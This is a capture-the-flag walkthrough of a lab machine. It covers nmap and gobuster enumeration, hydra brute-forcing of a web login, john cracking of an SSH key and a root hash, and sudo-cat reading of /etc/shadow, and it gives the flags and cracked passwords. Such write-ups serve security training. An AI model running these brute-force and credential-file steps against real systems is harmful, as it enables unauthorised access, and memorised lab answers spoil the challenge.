> Brute it

**export IP=10.10.172.147**

# Nmap

sudo nmap -sC -sV -T4 -Pn -vv -p- -oN nmap/initial $IP

```
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
```

# Gobuster

sudo gobuster dir -u http://10.10.172.147 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 20 -x txt,php,js,html,sql,bak,cgi,zip -o gobuster/initial

```
/admin (Status: 301)
```

And in the page-source of /admin we can find that john's username is admin.

# Cracking with hydra

hydra -l admin -P /usr/share/wordlists/rockyou.txt $IP http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -f

```
[80][http-post-form] host: 10.10.172.147   login: admin   password: xavier
```

# web flag

```
THM{brut3_f0rce_is_e4sy}
```

We got an id_rsa file but it requires password. Let's crack it using john.

john --wordlist=/usr/share/wordlists/rockyou.txt hash

```
rockinroll       (id_rsa)
```

ssh john@10.10.172.147 -i "id_rsa"

We are in as john!!

# user.txt

```
THM{a_password_is_not_a_barrier}
```

# Privilege Escalation

id

```
uid=1001(john) gid=1001(john) groups=1001(john),27(sudo)
```

sudo -l

```
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```

LFILE=/root/root.txt
sudo cat "$LFILE"

# root.txt

```
THM{pr1v1l3g3_3sc4l4t10n}
```

# root password

LFILE=/etc/shadow
sudo cat "$LFILE"

root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::

Let's save this to root_hash file and crack it using john.

# root password

```
football
```